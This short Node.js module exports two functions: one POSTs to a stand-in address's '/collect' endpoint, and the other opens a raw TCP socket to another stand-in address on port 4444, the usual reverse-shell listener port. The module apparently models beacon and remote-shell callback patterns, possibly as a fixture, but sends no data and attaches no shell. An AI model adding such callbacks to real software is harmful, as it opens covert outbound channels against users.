const net = require("net");
const HOST = "198.51.100.23";
exports.beacon = () => fetch("http://192.0.2.10/collect", { method: "POST" });
exports.socket = () => net.connect({ host: HOST, port: 4444 });
